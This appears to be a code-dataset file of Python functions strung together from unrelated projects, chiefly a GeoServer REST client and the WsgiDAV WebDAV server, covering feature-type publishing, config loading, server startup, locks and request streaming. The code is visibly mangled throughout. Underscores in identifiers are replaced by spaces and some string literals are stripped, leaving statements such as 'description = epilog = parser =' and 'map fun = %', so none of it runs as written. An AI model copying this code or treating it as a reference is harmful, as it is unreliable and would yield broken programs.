def publish featuretype ( self , name , store , native crs , srs = None , jdbc virtual table = None , native name = None ) : # @todo native srs doesn't seem to get detected, even when in the DB # metadata (at least for postgis in geometry columns) and then there # will be a misconfigured layer if native crs is None : raise Value Error ( "must specify native crs" ) srs = srs or native crs feature type = Feature Type ( self , store . workspace , store , name ) # because name is the in Feature Type base class, work around that # and hack in these others that don't have xml properties feature type . dirty [ 'name' ] = name feature type . dirty [ 'srs' ] = srs feature type . dirty [ 'native CRS' ] = native crs feature type . enabled = True feature type . advertised = True feature type . title = name if native name is not None : feature type . native name = native name headers = { "Content-type" : "application/xml" , "Accept" : "application/xml" } resource url = store . resource url if jdbc virtual table is not None : feature type . metadata = ( { 'JDBC VIRTUAL TABLE' : jdbc virtual table } ) params = dict ( ) resource url = build url ( self . service url , [ "workspaces" , store . workspace . name , "datastores" , store . name , "featuretypes.xml" ] , params ) resp = self . http request ( resource url , method = 'post' , data = feature type . message ( ) , headers = headers ) if resp . status code not in ( 200 , 201 , 202 ) : Failed Request Error ( 'Failed to publish feature type {} : {}, {}' . format ( name , resp . status code , resp . text ) ) self . cache . clear ( ) feature type . fetch ( ) return feature type
def md link ( node ) : mimetype = node . find ( "type" ) mdtype = node . find ( "metadata Type" ) content = node . find ( "content" ) if None in [ mimetype , mdtype , content ] : return None else : return ( mimetype . text , mdtype . text , content . text )
def md dimension info ( name , node ) : def get value ( child name ) : return getattr ( node . find ( child name ) , 'text' , None ) resolution = get value ( 'resolution' ) default Value = node . find ( "default Value" ) strategy = default Value . find ( "strategy" ) if default Value is not None else None strategy = strategy . text if strategy is not None else None return Dimension Info ( name , get value ( 'enabled' ) == 'true' , get value ( 'presentation' ) , int ( resolution ) if resolution else None , get value ( 'units' ) , get value ( 'unit Symbol' ) , strategy , get value ( 'attribute' ) , get value ( 'end Attribute' ) , get value ( 'reference Value' ) , get value ( 'nearest Match Enabled' ) )
def md dynamic default values info ( name , node ) : configurations = node . find ( "configurations" ) if configurations is not None : configurations = [ ] for n in node . findall ( "configuration" ) : dimension = n . find ( "dimension" ) dimension = dimension . text if dimension is not None else None policy = n . find ( "policy" ) policy = policy . text if policy is not None else None default Value Expression = n . find ( "default Value Expression" ) default Value Expression = default Value Expression . text if default Value Expression is not None else None configurations . append ( Dynamic Default Values Configuration ( dimension , policy , default Value Expression ) ) return Dynamic Default Values ( name , configurations )
def md jdbc virtual table ( key , node ) : name = node . find ( "name" ) sql = node . find ( "sql" ) escape Sql = node . find ( "escape Sql" ) escape Sql = escape Sql . text if escape Sql is not None else None key Column = node . find ( "key Column" ) key Column = key Column . text if key Column is not None else None n g = node . find ( "geometry" ) geometry = JDBC Virtual Table Geometry ( n g . find ( "name" ) , n g . find ( "type" ) , n g . find ( "srid" ) ) parameters = [ ] for n p in node . findall ( "parameter" ) : p name = n p . find ( "name" ) p default Value = n p . find ( "default Value" ) p default Value = p default Value . text if p default Value is not None else None p regexp Validator = n p . find ( "regexp Validator" ) p regexp Validator = p regexp Validator . text if p regexp Validator is not None else None parameters . append ( JDBC Virtual Table Param ( p name , p default Value , p regexp Validator ) ) return JDBC Virtual Table ( name , sql , escape Sql , geometry , key Column , parameters )
def md entry ( node ) : key = None value = None if 'key' in node . attrib : key = node . attrib [ 'key' ] else : key = None if key in [ 'time' , 'elevation' ] or key . startswith ( 'custom dimension' ) : value = md dimension info ( key , node . find ( "dimension Info" ) ) elif key == 'Dynamic Default Values' : value = md dynamic default values info ( key , node . find ( "Dynamic Default Values" ) ) elif key == 'JDBC VIRTUAL TABLE' : value = md jdbc virtual table ( key , node . find ( "virtual Table" ) ) else : value = node . text if None in [ key , value ] : return None else : return ( key , value )
def resolution millis ( self ) : if self . resolution is None or not isinstance ( self . resolution , basestring ) : return self . resolution val , mult = self . resolution . split ( ' ' ) return int ( float ( val ) * self . multipier ( mult ) * 1000 )
def as DAV Error ( e ) : if isinstance ( e , DAV Error ) : return e elif isinstance ( e , Exception ) : # traceback.print exc() return DAV Error ( HTTP INTERNAL ERROR , src exception = e ) else : return DAV Error ( HTTP INTERNAL ERROR , "{}" . format ( e ) )
def get user info ( self ) : if self . value in ERROR DESCRIPTIONS : s = "{}" . format ( ERROR DESCRIPTIONS [ self . value ] ) else : s = "{}" . format ( self . value ) if self . context info : s += ": {}" . format ( self . context info ) elif self . value in ERROR RESPONSES : s += ": {}" . format ( ERROR RESPONSES [ self . value ] ) if self . src exception : s += "\n    Source exception: '{}'" . format ( self . src exception ) if self . err condition : s += "\n    Error condition: '{}'" . format ( self . err condition ) return s
def handle delete ( self ) : # DELETE is only supported for the '/by tag/' collection if "/by tag/" not in self . path : raise DAV Error ( HTTP FORBIDDEN ) # path must be '/by tag/<tag>/<resname>' cat Type , tag , rest = util . save split ( self . path . strip ( "/" ) , "/" , 2 ) assert cat Type == "by tag" assert tag in self . data [ "tags" ] self . data [ "tags" ] . remove ( tag ) return True
def handle copy ( self , dest path , depth infinity ) : # dest Path must be '/by tag/<tag>/<resname>' if "/by tag/" not in dest path : raise DAV Error ( HTTP FORBIDDEN ) cat Type , tag , rest = util . save split ( dest path . strip ( "/" ) , "/" , 2 ) assert cat Type == "by tag" if tag not in self . data [ "tags" ] : self . data [ "tags" ] . append ( tag ) return True
def handle move ( self , dest path ) : # path and dest Path must be '/by tag/<tag>/<resname>' if "/by tag/" not in self . path : raise DAV Error ( HTTP FORBIDDEN ) if "/by tag/" not in dest path : raise DAV Error ( HTTP FORBIDDEN ) cat Type , tag , rest = util . save split ( self . path . strip ( "/" ) , "/" , 2 ) assert cat Type == "by tag" assert tag in self . data [ "tags" ] self . data [ "tags" ] . remove ( tag ) cat Type , tag , rest = util . save split ( dest path . strip ( "/" ) , "/" , 2 ) assert cat Type == "by tag" if tag not in self . data [ "tags" ] : self . data [ "tags" ] . append ( tag ) return True
def add provider ( self , share , provider , readonly = False ) : # Make sure share starts with, or is '/' share = "/" + share . strip ( "/" ) assert share not in self . provider map if compat . is basestring ( provider ) : # Syntax: #   <mount path>: <folder path> # We allow a simple string as 'provider'. In this case we interpret # it as a file system root folder that is published. provider = Filesystem Provider ( provider , readonly ) elif type ( provider ) in ( dict , ) : if "provider" in provider : # Syntax: #   <mount path>: {"provider": <class path>, "args": <pos args>, "kwargs": <named args} prov class = dynamic import class ( provider [ "provider" ] ) provider = prov class ( * provider . get ( "args" , [ ] ) , * * provider . get ( "kwargs" , { } ) ) else : # Syntax: #   <mount path>: {"root": <path>, "redaonly": <bool>} provider = Filesystem Provider ( provider [ "root" ] , bool ( provider . get ( "readonly" , False ) ) ) elif type ( provider ) in ( list , tuple ) : raise Value Error ( "Provider {}: tuple/list syntax is no longer supported" . format ( provider ) ) # provider = Filesystem Provider(provider[0], provider[1]) if not isinstance ( provider , DAV Provider ) : raise Value Error ( "Invalid provider {}" . format ( provider ) ) provider . set share path ( share ) if self . mount path : provider . set mount path ( self . mount path ) # TODO: someday we may want to configure different lock/prop # managers per provider provider . set lock manager ( self . lock manager ) provider . set prop manager ( self . prop manager ) self . provider map [ share ] = provider # self.provider map[share] = {"provider": provider, "allow anonymous": False} # Store the list of share paths, ordered by length, so route lookups # will return the most specific match self . sorted share list = [ s . lower ( ) for s in self . provider map . keys ( ) ] self . sorted share list = sorted ( self . sorted share list , key = len , reverse = True ) return provider
def read ( self , size = None ) : while size is None or len ( self . buffer ) < size : try : self . buffer += next ( self . data stream ) except Stop Iteration : break sized chunk = self . buffer [ : size ] if size is None : self . buffer = "" else : self . buffer = self . buffer [ size : ] return sized chunk
def handle copy ( self , dest path , depth infinity ) : dest Type , dest Hg Path = util . pop path ( dest path ) dest Hg Path = dest Hg Path . strip ( "/" ) ui = self . provider . ui repo = self . provider . repo logger . info ( "handle copy %s -> %s" % ( self . local Hg Path , dest Hg Path ) ) if self . rev is None and dest Type == "edit" : # COPY /edit/a/b to /edit/c/d: turn into 'hg copy -f a/b c/d' commands . copy ( ui , repo , self . local Hg Path , dest Hg Path , force = True ) elif self . rev is None and dest Type == "released" : # COPY /edit/a/b to /released/c/d # This is interpreted as 'hg commit a/b' (ignoring the dest. path) self . commit ( "Wsgi DAV commit (COPY %s -> %s)" % ( self . path , dest path ) ) else : raise DAV Error ( HTTP FORBIDDEN ) # Return True: request was handled return True
def get log ( self , limit = None ) : self . ui . pushbuffer ( ) commands . log ( self . ui , self . repo , limit = limit , date = None , rev = None , user = None ) res = self . ui . popbuffer ( ) . strip ( ) log List = [ ] for logentry in res . split ( "\n\n" ) : log = { } log List . append ( log ) for line in logentry . split ( "\n" ) : k , v = line . split ( ":" , 1 ) assert k in ( "changeset" , "tag" , "user" , "date" , "summary" ) log [ k . strip ( ) ] = v . strip ( ) log [ "parsed date" ] = util . parse time string ( log [ "date" ] ) local id , unid = log [ "changeset" ] . split ( ":" ) log [ "local id" ] = int ( local id ) log [ "unid" ] = unid #        pprint(log List) return log List
def remove all properties ( self , recursive ) : if self . provider . prop manager : self . provider . prop manager . remove properties ( self . get ref url ( ) , self . environ )
def is locked ( self ) : if self . provider . lock manager is None : return False return self . provider . lock manager . is url locked ( self . get ref url ( ) )
def string to xml ( text ) : try : return etree . XML ( text ) except Exception : # TODO: # Expat Error: reference to invalid character number: line 1, column 62 # litmus fails, when xml is used instead of lxml # 18. propget............... FAIL (PROPFIND on `/temp/litmus/prop2': #   Could not read status line: connection was closed by server) # text = <ns0:high-unicode xmlns:ns0="http://example.com/neon/litmus/">&#55296;&#56320; #   </ns0:high-unicode> #        t2 = text.encode("utf8") #        return etree.XML(t2) logger . error ( "Error parsing XML string. " "If lxml is not available, and unicode is involved, then " "installing lxml  may  solve this issue." ) logger . error ( "XML source: {}" . format ( text ) ) raise
def make sub element ( parent , tag , nsmap = None ) : if use lxml : return etree . Sub Element ( parent , tag , nsmap = nsmap ) return etree . Sub Element ( parent , tag )
def get checked path ( path , config , must exist = True , allow none = True ) : if path in ( None , "" ) : if allow none : return None raise Value Error ( "Invalid path {!r}" . format ( path ) ) # Evaluate path relative to the folder of the config file (if any) config file = config . get ( " config file" ) if config file and not os . path . isabs ( path ) : path = os . path . normpath ( os . path . join ( os . path . dirname ( config file ) , path ) ) else : path = os . path . abspath ( path ) if must exist and not os . path . exists ( path ) : raise Value Error ( "Invalid path {!r}" . format ( path ) ) return path
def init command line options ( ) : description = epilog = parser = argparse . Argument Parser ( prog = "wsgidav" , description = description , epilog = epilog , # allow abbrev=False,  # Py3.5+ formatter class = argparse . Raw Text Help Formatter , ) parser . add argument ( "-p" , "--port" , dest = "port" , type = int , # default=8080, help = "port to serve on (default: 8080)" , ) parser . add argument ( "-H" , # '-h' conflicts with --help "--host" , dest = "host" , help = ( "host to serve from (default: localhost). 'localhost' is only " "accessible from the local computer. Use 0.0.0.0 to make your " "application public" ) , ) , parser . add argument ( "-r" , "--root" , dest = "root path" , action = Full Expanded Path , help = "path to a file system folder to publish as share '/'." , ) parser . add argument ( "--auth" , choices = ( "anonymous" , "nt" , "pam-login" ) , help = "quick configuration of a domain controller when no config file " "is used" , ) parser . add argument ( "--server" , choices = SUPPORTED SERVERS . keys ( ) , # default="cheroot", help = "type of pre-installed WSGI server to use (default: cheroot)." , ) parser . add argument ( "--ssl-adapter" , choices = ( "builtin" , "pyopenssl" ) , # default="builtin", help = "used by 'cheroot' server if SSL certificates are configured " "(default: builtin)." , ) qv group = parser . add mutually exclusive group ( ) qv group . add argument ( "-v" , "--verbose" , action = "count" , default = 3 , help = "increment verbosity by one (default: %(default)s, range: 0..5)" , ) qv group . add argument ( "-q" , "--quiet" , default = 0 , action = "count" , help = "decrement verbosity by one" ) qv group = parser . add mutually exclusive group ( ) qv group . add argument ( "-c" , "--config" , dest = "config file" , action = Full Expanded Path , help = ( "configuration file (default: {} in current directory)" . format ( DEFAULT CONFIG FILES ) ) , ) qv group . add argument ( "--no-config" , action = "store true" , dest = "no config" , help = "do not try to load default {}" . format ( DEFAULT CONFIG FILES ) , ) parser . add argument ( "-V" , "--version" , action = "store true" , help = "print version info and exit (may be combined with --verbose)" , ) args = parser . parse args ( ) args . verbose -= args . quiet del args . quiet if args . root path and not os . path . isdir ( args . root path ) : msg = "{} is not a directory" . format ( args . root path ) raise parser . error ( msg ) if args . version : if args . verbose >= 4 : msg = "Wsgi DAV/{} Python/{} {}" . format ( version , util . PYTHON VERSION , platform . platform ( aliased = True ) ) else : msg = "{}" . format ( version ) print ( msg ) sys . exit ( ) if args . no config : pass # ... else ignore default config files elif args . config file is None : # If --config was omitted, use default (if it exists) for filename in DEFAULT CONFIG FILES : def Path = os . path . abspath ( filename ) if os . path . exists ( def Path ) : if args . verbose >= 3 : print ( "Using default configuration file: {}" . format ( def Path ) ) args . config file = def Path break else : # If --config was specified convert to absolute path and assert it exists args . config file = os . path . abspath ( args . config file ) if not os . path . isfile ( args . config file ) : parser . error ( "Could not find specified configuration file: {}" . format ( args . config file ) ) # Convert args object to dictionary cmd Line Opts = args . dict . copy ( ) if args . verbose >= 5 : print ( "Command line args:" ) for k , v in cmd Line Opts . items ( ) : print ( "    {:>12}: {}" . format ( k , v ) ) return cmd Line Opts , parser
def read config file ( config file , verbose ) : config file = os . path . abspath ( config file ) if not os . path . exists ( config file ) : raise Runtime Error ( "Couldn't open configuration file '{}'." . format ( config file ) ) if config file . endswith ( ".json" ) : with io . open ( config file , mode = "r" , encoding = "utf-8" ) as json file : # Minify the JSON file to strip embedded comments minified = jsmin ( json file . read ( ) ) conf = json . loads ( minified ) elif config file . endswith ( ".yaml" ) : with io . open ( config file , mode = "r" , encoding = "utf-8" ) as yaml file : conf = yaml . safe load ( yaml file ) else : try : import imp conf = { } configmodule = imp . load source ( "configuration module" , config file ) for k , v in vars ( configmodule ) . items ( ) : if k . startswith ( " " ) : continue elif isfunction ( v ) : continue conf [ k ] = v except Exception : exc type , exc value = sys . exc info ( ) [ : 2 ] exc info list = traceback . format exception only ( exc type , exc value ) exc text = "\n" . join ( exc info list ) print ( "Failed to read configuration file: " + config file + "\n Due to " + exc text , file = sys . stderr , ) raise conf [ " config file" ] = config file return conf
def init config ( ) : cli opts , parser = init command line options ( ) cli verbose = cli opts [ "verbose" ] # Set config defaults config = copy . deepcopy ( DEFAULT CONFIG ) # Configuration file overrides defaults config file = cli opts . get ( "config file" ) if config file : file opts = read config file ( config file , cli verbose ) util . deep update ( config , file opts ) if cli verbose != DEFAULT VERBOSE and "verbose" in file opts : if cli verbose >= 2 : print ( "Config file defines 'verbose: {}' but is overridden by command line: {}." . format ( file opts [ "verbose" ] , cli verbose ) ) config [ "verbose" ] = cli verbose else : if cli verbose >= 2 : print ( "Running without configuration file." ) # Command line overrides file if cli opts . get ( "port" ) : config [ "port" ] = cli opts . get ( "port" ) if cli opts . get ( "host" ) : config [ "host" ] = cli opts . get ( "host" ) if cli opts . get ( "profile" ) is not None : config [ "profile" ] = True if cli opts . get ( "server" ) is not None : config [ "server" ] = cli opts . get ( "server" ) if cli opts . get ( "ssl adapter" ) is not None : config [ "ssl adapter" ] = cli opts . get ( "ssl adapter" ) # Command line overrides file only if -v or -q where passed: if cli opts . get ( "verbose" ) != DEFAULT VERBOSE : config [ "verbose" ] = cli opts . get ( "verbose" ) if cli opts . get ( "root path" ) : root path = os . path . abspath ( cli opts . get ( "root path" ) ) config [ "provider mapping" ] [ "/" ] = Filesystem Provider ( root path ) if config [ "verbose" ] >= 5 : # TODO: remove passwords from user mapping # config cleaned = copy.deepcopy(config) print ( "Configuration({}):\n{}" . format ( cli opts [ "config file" ] , pformat ( config ) ) ) if not config [ "provider mapping" ] : parser . error ( "No DAV provider defined." ) # Quick-configuration of Domain Controller auth = cli opts . get ( "auth" ) auth conf = config . get ( "http authenticator" , { } ) if auth and auth conf . get ( "domain controller" ) : parser . error ( "--auth option can only be used when no domain controller is configured" ) if auth == "anonymous" : if config [ "simple dc" ] [ "user mapping" ] : parser . error ( "--auth=anonymous can only be used when no user mapping is configured" ) auth conf . update ( { "domain controller" : "wsgidav.dc.simple dc.Simple Domain Controller" , "accept basic" : True , "accept digest" : True , "default to digest" : True , } ) config [ "simple dc" ] [ "user mapping" ] = { "*" : True } elif auth == "nt" : if config . get ( "nt dc" ) : parser . error ( "--auth=nt can only be used when no nt dc settings are configured" ) auth conf . update ( { "domain controller" : "wsgidav.dc.nt dc.NT Domain Controller" , "accept basic" : True , "accept digest" : False , "default to digest" : False , } ) config [ "nt dc" ] = { } elif auth == "pam-login" : if config . get ( "pam dc" ) : parser . error ( "--auth=pam-login can only be used when no pam dc settings are configured" ) auth conf . update ( { "domain controller" : "wsgidav.dc.pam dc.PAM Domain Controller" , "accept basic" : True , "accept digest" : False , "default to digest" : False , } ) config [ "pam dc" ] = { "service" : "login" } # print(config) if cli opts . get ( "reload" ) : print ( "Installing paste.reloader." , file = sys . stderr ) from paste import reloader # @Unresolved Import reloader . install ( ) if config file : # Add config file changes reloader . watch file ( config file ) # import pydevd # pydevd.settrace() return config
def run cherrypy ( app , config , mode ) : assert mode == "cherrypy-wsgiserver" try : from cherrypy import wsgiserver from cherrypy . wsgiserver . ssl builtin import Builtin SSL Adapter logger . warning ( "WARNING: cherrypy.wsgiserver is deprecated." ) logger . warning ( "         Starting with Cherry Py 9.0 the functionality from cherrypy.wsgiserver" ) logger . warning ( "         was moved to the cheroot project." ) logger . warning ( "         Consider using --server=cheroot." ) except Import Error : logger . error ( "*" * 78 ) logger . error ( "ERROR: Could not import cherrypy.wsgiserver." ) logger . error ( "Try `pip install cherrypy` or specify another server using the --server option." ) logger . error ( "Note that starting with Cherry Py 9.0, the server was moved to" ) logger . error ( "the cheroot project, so it is recommended to use `-server=cheroot`" ) logger . error ( "and run `pip install cheroot` instead." ) logger . error ( "*" * 78 ) raise server name = "Wsgi DAV/{} {} Python/{}" . format ( version , wsgiserver . Cherry Py WSGI Server . version , util . PYTHON VERSION ) wsgiserver . Cherry Py WSGI Server . version = server name # Support SSL ssl certificate = get checked path ( config . get ( "ssl certificate" ) , config ) ssl private key = get checked path ( config . get ( "ssl private key" ) , config ) ssl certificate chain = get checked path ( config . get ( "ssl certificate chain" ) , config ) protocol = "http" if ssl certificate : assert ssl private key wsgiserver . Cherry Py WSGI Server . ssl adapter = Builtin SSL Adapter ( ssl certificate , ssl private key , ssl certificate chain ) protocol = "https" logger . info ( "SSL / HTTPS enabled." ) logger . info ( "Running {}" . format ( server name ) ) logger . info ( "Serving on {}://{}:{} ..." . format ( protocol , config [ "host" ] , config [ "port" ] ) ) server args = { "bind addr" : ( config [ "host" ] , config [ "port" ] ) , "wsgi app" : app , "server name" : server name , } # Override or add custom args server args . update ( config . get ( "server args" , { } ) ) server = wsgiserver . Cherry Py WSGI Server ( * * server args ) # If the caller passed a startup event, monkey patch the server to set it # when the request handler loop is entered startup event = config . get ( "startup event" ) if startup event : def patched tick ( ) : server . tick = org tick # undo the monkey patch org tick ( ) logger . info ( "Cherry Py WSGI Server is ready" ) startup event . set ( ) org tick = server . tick server . tick = patched tick try : server . start ( ) except Keyboard Interrupt : logger . warning ( "Caught Ctrl-C, shutting down..." ) finally : server . stop ( ) return
def run cheroot ( app , config , mode ) : assert mode == "cheroot" try : from cheroot import server , wsgi #         from cheroot.ssl.builtin import Builtin SSL Adapter #         import cheroot.ssl.pyopenssl except Import Error : logger . error ( "*" * 78 ) logger . error ( "ERROR: Could not import Cheroot." ) logger . error ( "Try `pip install cheroot` or specify another server using the --server option." ) logger . error ( "*" * 78 ) raise server name = "Wsgi DAV/{} {} Python/{}" . format ( version , wsgi . Server . version , util . PYTHON VERSION ) wsgi . Server . version = server name # Support SSL ssl certificate = get checked path ( config . get ( "ssl certificate" ) , config ) ssl private key = get checked path ( config . get ( "ssl private key" ) , config ) ssl certificate chain = get checked path ( config . get ( "ssl certificate chain" ) , config ) ssl adapter = config . get ( "ssl adapter" , "builtin" ) protocol = "http" if ssl certificate and ssl private key : ssl adapter = server . get ssl adapter class ( ssl adapter ) wsgi . Server . ssl adapter = ssl adapter ( ssl certificate , ssl private key , ssl certificate chain ) protocol = "https" logger . info ( "SSL / HTTPS enabled. Adapter: {}" . format ( ssl adapter ) ) elif ssl certificate or ssl private key : raise Runtime Error ( "Option 'ssl certificate' and 'ssl private key' must be used together." ) #     elif ssl adapter: #         print("WARNING: Ignored option 'ssl adapter' (requires 'ssl certificate').") logger . info ( "Running {}" . format ( server name ) ) logger . info ( "Serving on {}://{}:{} ..." . format ( protocol , config [ "host" ] , config [ "port" ] ) ) server args = { "bind addr" : ( config [ "host" ] , config [ "port" ] ) , "wsgi app" : app , "server name" : server name , } # Override or add custom args server args . update ( config . get ( "server args" , { } ) ) server = wsgi . Server ( * * server args ) # If the caller passed a startup event, monkey patch the server to set it # when the request handler loop is entered startup event = config . get ( "startup event" ) if startup event : def patched tick ( ) : server . tick = org tick # undo the monkey patch logger . info ( "wsgi.Server is ready" ) startup event . set ( ) org tick ( ) org tick = server . tick server . tick = patched tick try : server . start ( ) except Keyboard Interrupt : logger . warning ( "Caught Ctrl-C, shutting down..." ) finally : server . stop ( ) return
def run flup ( app , config , mode ) : # http://trac.saddi.com/flup/wiki/Flup Servers if mode == "flup-fcgi" : from flup . server . fcgi import WSGI Server , version as flupver elif mode == "flup-fcgi-fork" : from flup . server . fcgi fork import WSGI Server , version as flupver else : raise Value Error logger . info ( "Running Wsgi DAV/{} {}/{}..." . format ( version , WSGI Server . module , flupver ) ) server = WSGI Server ( app , bind Address = ( config [ "host" ] , config [ "port" ] ) , # debug=True, ) try : server . run ( ) except Keyboard Interrupt : logger . warning ( "Caught Ctrl-C, shutting down..." ) return
def run wsgiref ( app , config , mode ) : # http://www.python.org/doc/2.5.2/lib/module-wsgiref.html from wsgiref . simple server import make server , software version version = "Wsgi DAV/{} {}" . format ( version , software version ) logger . info ( "Running {}..." . format ( version ) ) logger . warning ( "WARNING: This single threaded server (wsgiref) is not meant for production." ) httpd = make server ( config [ "host" ] , config [ "port" ] , app ) try : httpd . serve forever ( ) except Keyboard Interrupt : logger . warning ( "Caught Ctrl-C, shutting down..." ) return
def run ext wsgiutils ( app , config , mode ) : from wsgidav . server import ext wsgiutils server logger . info ( "Running Wsgi DAV {} on wsgidav.ext wsgiutils server..." . format ( version ) ) logger . warning ( "WARNING: This single threaded server (ext-wsgiutils) is not meant for production." ) try : ext wsgiutils server . serve ( config , app ) except Keyboard Interrupt : logger . warning ( "Caught Ctrl-C, shutting down..." ) return
def stream data chunked ( self , environ , block size ) : # Chunked Transfer Coding # http://www.servlets.com/rfcs/rfc2616-sec3.html#sec3.6.1 if "Darwin" in environ . get ( "HTTP USER AGENT" , "" ) and environ . get ( "HTTP X EXPECTED ENTITY LENGTH" ) : # Mac Finder, that does not prepend chunk-size + CRLF , # like it should to comply with the spec. It sends chunk # size as integer in a HTTP header instead. WORKAROUND CHUNK LENGTH = True buf = environ . get ( "HTTP X EXPECTED ENTITY LENGTH" , "0" ) length = int ( buf ) else : WORKAROUND CHUNK LENGTH = False buf = environ [ "wsgi.input" ] . readline ( ) environ [ "wsgidav.some input read" ] = 1 if buf == compat . b empty : length = 0 else : length = int ( buf , 16 ) while length > 0 : buf = environ [ "wsgi.input" ] . read ( block size ) yield buf if WORKAROUND CHUNK LENGTH : environ [ "wsgidav.some input read" ] = 1 # Keep receiving until we read expected size or reach # EOF if buf == compat . b empty : length = 0 else : length -= len ( buf ) else : environ [ "wsgi.input" ] . readline ( ) buf = environ [ "wsgi.input" ] . readline ( ) if buf == compat . b empty : length = 0 else : length = int ( buf , 16 ) environ [ "wsgidav.all input read" ] = 1
def stream data ( self , environ , content length , block size ) : if content length == 0 : # TODO: review this # XP and Vista Mini Redir submit PUT with Content-Length 0, # before LOCK and the real PUT. So we have to accept this. logger . info ( "PUT: Content-Length == 0. Creating empty file..." ) #        elif content length < 0: #            # TODO: review this #            # If CONTENT LENGTH is invalid, we may try to workaround this #            # by reading until the end of the stream. This may block however! #            # The iterator produced small chunks of varying size, but not #            # sure, if we always get everything before it times out. #             logger.warning("PUT with invalid Content-Length (%s). " #                            "Trying to read all (this may timeout)..." #                            .format(environ.get("CONTENT LENGTH"))) #            nb = 0 #            try: #                for s in environ["wsgi.input"]: #                    environ["wsgidav.some input read"] = 1 #                     logger.debug("PUT: read from wsgi.input. iter , len=%s" % len(s)) #                    yield s #                    nb += len (s) #            except socket.timeout: #                 logger.warning("PUT: input timed out after writing %s bytes" % nb) #                has Errors = True else : assert content length > 0 contentremain = content length while contentremain > 0 : n = min ( contentremain , block size ) readbuffer = environ [ "wsgi.input" ] . read ( n ) # This happens with litmus expect-100 test: if not len ( readbuffer ) > 0 : logger . error ( "input.read({}) returned 0 bytes" . format ( n ) ) break environ [ "wsgidav.some input read" ] = 1 yield readbuffer contentremain -= len ( readbuffer ) if contentremain == 0 : environ [ "wsgidav.all input read" ] = 1
def find ( self , url ) : # Query the permanent view to find a url vr = self . db . view ( "properties/by url" , key = url , include docs = True ) logger . debug ( "find(%r) returned %s" % ( url , len ( vr ) ) ) assert len ( vr ) <= 1 , "Found multiple matches for %r" % url for row in vr : assert row . doc return row . doc return None
def find descendents ( self , url ) : # Ad-hoc query for URL starting with a prefix map fun = % ( url + "/" ) vr = self . db . query ( map fun , include docs = True ) for row in vr : yield row . doc return
def get domain realm ( self , path info , environ ) : realm = self . calc realm from path provider ( path info , environ ) return realm
def digest auth user ( self , realm , user name , environ ) : user = self . get realm entry ( realm , user name ) if user is None : return False password = user . get ( "password" ) environ [ "wsgidav.auth.roles" ] = user . get ( "roles" , [ ] ) return self . compute http digest a1 ( realm , user name , password )
def flush ( self ) : logger . debug ( " flush()" ) self . lock . acquire write ( ) # TODO: read access is enough? try : self . dict . sync ( ) finally : self . lock . release ( )
def clear ( self ) : self . lock . acquire write ( ) # TODO: read access is enough? try : was closed = self . dict is None if was closed : self . open ( ) if len ( self . dict ) : self . dict . clear ( ) self . dict . sync ( ) if was closed : self . close ( ) finally : self . lock . release ( )
def set last modified ( self , dest path , time stamp , dry run ) : # Translate time from RFC 1123 to seconds since epoch format secs = util . parse time string ( time stamp ) if not dry run : os . utime ( self . file path , ( secs , secs ) ) return True
def lock string ( lock dict ) : if not lock dict : return "Lock: None" if lock dict [ "expire" ] < 0 : expire = "Infinite ({})" . format ( lock dict [ "expire" ] ) else : expire = "{} (in {} seconds)" . format ( util . get log time ( lock dict [ "expire" ] ) , lock dict [ "expire" ] - time . time ( ) ) return "Lock(<{}..>, '{}', {}, {}, depth-{}, until {}" . format ( # first 4 significant token characters lock dict . get ( "token" , "?" * 30 ) [ 18 : 22 ] , lock dict . get ( "root" ) , lock dict . get ( "principal" ) , lock dict . get ( "scope" ) , lock dict . get ( "depth" ) , expire , )
def refresh ( self , token , timeout = None ) : if timeout is None : timeout = Lock Manager . LOCK TIME OUT DEFAULT return self . storage . refresh ( token , timeout )
def sync ( self ) : logger . debug ( " sync()" ) self . lock . acquire write ( ) # TODO: read access is enough? try : if self . loaded : self . dict . sync ( ) finally : self . lock . release ( )
def dynamic import class ( name ) : import importlib module name , class name = name . rsplit ( "." , 1 ) try : module = importlib . import module ( module name ) except Exception as e : logger . exception ( "Dynamic import of {!r} failed: {}" . format ( name , e ) ) raise the class = getattr ( module , class name ) return the class
def string repr ( s ) : if compat . is bytes ( s ) : res = "{!r}: " . format ( s ) for b in s : if type ( b ) is str : # Py2 b = ord ( b ) res += "%02x " % b return res return "{}" . format ( s )
def byte number string ( number , thousands Sep = True , partition = False , base1024 = True , append Bytes = True ) : magsuffix = "" bytesuffix = "" if partition : magnitude = 0 if base1024 : while number >= 1024 : magnitude += 1 number = number >> 10 else : while number >= 1000 : magnitude += 1 number /= 1000.0 # TODO: use "9 KB" instead of "9K Bytes"? # TODO use 'kibi' for base 1024? # http://en.wikipedia.org/wiki/Kibi-#IEC standard prefixes magsuffix = [ "" , "K" , "M" , "G" , "T" , "P" ] [ magnitude ] if append Bytes : if number == 1 : bytesuffix = " Byte" else : bytesuffix = " Bytes" if thousands Sep and ( number >= 1000 or magsuffix ) : # locale.setlocale(locale.LC ALL, "") # # TODO: make precision configurable # snum = locale.format("%d", number, thousands Sep) snum = "{:,d}" . format ( number ) else : snum = str ( number ) return "{}{}{}" . format ( snum , magsuffix , bytesuffix )
def send status response ( environ , start response , e , add headers = None , is head = False ) : status = get http status string ( e ) headers = [ ] if add headers : headers . extend ( add headers ) #    if 'keep-alive' in environ.get('HTTP CONNECTION', '').lower(): #        headers += [ #            ('Connection', 'keep-alive'), #        ] if e in ( HTTP NOT MODIFIED , HTTP NO CONTENT ) : # See paste.lint: these code don't have content start response ( status , [ ( "Content-Length" , "0" ) , ( "Date" , get rfc1123 time ( ) ) ] + headers ) return [ b"" ] if e in ( HTTP OK , HTTP CREATED ) : e = DAV Error ( e ) assert isinstance ( e , DAV Error ) content type , body = e . get response page ( ) if is head : body = compat . b empty assert compat . is bytes ( body ) , body # If not, Content-Length is wrong! start response ( status , [ ( "Content-Type" , content type ) , ( "Date" , get rfc1123 time ( ) ) , ( "Content-Length" , str ( len ( body ) ) ) , ] + headers , ) return [ body ]
def calc base64 ( s ) : s = compat . to bytes ( s ) s = compat . base64 encodebytes ( s ) . strip ( ) # return bytestring return compat . to native ( s )
def read timeout value header ( timeoutvalue ) : timeoutsecs = 0 timeoutvaluelist = timeoutvalue . split ( "," ) for timeoutspec in timeoutvaluelist : timeoutspec = timeoutspec . strip ( ) if timeoutspec . lower ( ) == "infinite" : return - 1 else : list SR = re Seconds Reader . findall ( timeoutspec ) for secs in list SR : timeoutsecs = int ( secs ) if timeoutsecs > MAX FINITE TIMEOUT LIMIT : return - 1 if timeoutsecs != 0 : return timeoutsecs return None
def generate index ( self ) : self . dict = { v . id : k for k , v in enumerate ( self ) }
